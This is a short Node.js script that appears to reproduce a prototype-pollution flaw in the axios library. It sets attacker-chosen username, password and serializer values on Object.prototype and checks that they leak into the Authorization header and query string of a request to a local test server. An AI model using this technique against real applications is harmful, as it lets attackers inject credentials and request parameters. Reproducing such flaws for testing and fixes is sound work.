import http from 'node:http';
import axios from '../../index.js';

const expectedAuthorization = 'Basic YXR0YWNrZXI6ZXhmaWw=';

function listen(server) {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve(server.address().port));
  });
}

function close(server) {
  return new Promise((resolve, reject) => {
    server.close((err) => (err ? reject(err) : resolve()));
  });
}

const server = http.createServer((req, res) => {
  const body = JSON.stringify({
    authorization: req.headers.authorization,
    url: req.url,
  });

  res.writeHead(200, {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(body),
  });
  res.end(body);
});

let port;

try {
  port = await listen(server);

  Object.defineProperties(Object.prototype, {
    username: {
      configurable: true,
      value: 'attacker',
    },
    password: {
      configurable: true,
      value: 'exfil',
    },
    serialize: {
      configurable: true,
      value: () => 'polluted=1',
    },
  });

  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
    auth: {},
    params: {
      safe: 'value',
    },
    paramsSerializer: {},
  });

  const evidence =
    typeof response.data === 'string' ? JSON.parse(response.data) : response.data;

  console.log(JSON.stringify(evidence));

  if (
    evidence.authorization !== expectedAuthorization ||
    evidence.url !== '/demo?polluted=1'
  ) {
    throw new Error(
      `nested option pollution did not reproduce: ${JSON.stringify(evidence)}`
    );
  }
} finally {
  delete Object.prototype.username;
  delete Object.prototype.password;
  delete Object.prototype.serialize;

  if (port !== undefined) {
    await close(server);
  }
}
